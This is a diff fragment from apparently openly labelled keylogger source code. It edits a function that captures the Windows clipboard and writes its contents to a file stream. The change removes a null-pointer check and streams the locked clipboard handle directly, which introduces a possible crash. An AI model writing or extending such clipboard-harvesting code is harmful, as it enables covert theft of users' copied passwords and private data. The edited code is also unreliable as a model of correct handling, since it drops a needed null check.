@@ -42,9 +42,7 @@ void keylogger::write_clipboard_data(std::wofstream& stream)
 
         if (handle != nullptr)
         {
-            const WCHAR* const buffer = static_cast<WCHAR*>(GlobalLock(handle));
-
-            if (buffer != nullptr) stream << buffer;
+            stream << static_cast<WCHAR*>(GlobalLock(handle));
 
             GlobalUnlock(handle);
         }
